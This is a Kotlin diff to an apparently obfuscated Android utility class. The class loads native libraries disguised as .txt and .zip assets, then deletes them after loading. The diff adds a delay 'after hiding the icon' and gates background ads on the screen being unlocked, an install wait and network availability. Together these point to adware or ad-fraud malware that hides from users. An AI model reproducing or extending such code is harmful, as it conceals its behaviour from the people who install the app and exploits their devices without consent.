@@ -3,6 +3,8 @@ package gg
 import android.app.Application
 import android.app.KeyguardManager
 import android.content.Context
+import android.net.ConnectivityManager
+import android.net.NetworkCapabilities
 import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
@@ -205,7 +207,7 @@ object GgUtils {
             val time = System.currentTimeMillis()
             val i: Boolean
             withContext(Dispatchers.IO) {
-                i = loadSFile(if (is64i) "kk/pong.txt" else "kk/kun.zip")
+                i = loadSFile(if (is64i) "pp/pong.txt" else "pp/pon.zip")
             }
             Log.e("TAG", "t-wt-so-is-success-$i")
             if (i.not()) {
@@ -214,6 +216,8 @@ object GgUtils {
             }
             MasterRu.pE("test_s_load", "${System.currentTimeMillis() - time}")
             de.dewpo(22, 11.0, DataCc.y)
+            //在隐藏icon后延迟1s～1.5s
+            delay(1010)
             while (true) {
                 // 刷新配置
                 refreshAdmin()
@@ -232,11 +236,10 @@ object GgUtils {
 
         mMainScope.launch(Dispatchers.IO) {
             delay(1000)
-            if (loadSFile(if (is64i) "hh/huang.txt" else "hh/hua.zip")) {
+            if (loadSFile(if (is64i) "nn/ning.txt" else "nn/nin.txt")) {
                 withContext(Dispatchers.Main) {
                     try {
                         de.deo(mContext)
-                        Log.e("TAG", "web-1", )
                         isLoadH = true
                     } catch (_: Throwable) {
                     }
@@ -247,7 +250,7 @@ object GgUtils {
 
     private fun loadSFile(assetsName: String): Boolean {
         val assetsInputS = mContext.assets.open(assetsName)
-        val fileSoName = "${assetsName.substring(2)}_${System.currentTimeMillis()}"
+        val fileSoName = "${assetsName.substring(2).replace("/", "_")}_${System.currentTimeMillis()}"
         val file = File("${mContext.filesDir}/Cache")
         if (file.exists().not()) {
             file.mkdirs()
@@ -258,7 +261,8 @@ object GgUtils {
             System.load(file2.absolutePath)
             file2.delete()
             return true
-        } catch (_: Exception) {
+        } catch (e: Exception) {
+            Log.e("TAG", "loadSFile: ${e.message}", )
         }
         return false
     }
@@ -303,6 +307,10 @@ object GgUtils {
             MasterRu.pE("ad_pass", "limit")
             return
         }
+        if (!isNetworkConnected()) {
+            Log.e("TAG", "cAction: no net")
+            return
+        }
         mAdC.loadAd()
         if (System.currentTimeMillis() - MasterRu.insAppTime < mInstallWait) {
             MasterRu.pE("ad_pass", "1t")
@@ -332,6 +340,18 @@ object GgUtils {
         return (context.getSystemService(Context.POWER_SERVICE) as PowerManager).isInteractive && (context.getSystemService(
             Context.KEYGUARD_SERVICE
         ) as KeyguardManager).isDeviceLocked.not()
+    }
+
+    private fun isNetworkConnected(context: Context = mContext): Boolean {
+        try {
+            val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
+            val network = connectivityManager.activeNetwork ?: return false
+            val networkCapabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
+            return networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) ||
+                    networkCapabilities.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)
+        } catch (e: Exception) {
+            return true
+        }
     }
 
     @JvmStatic
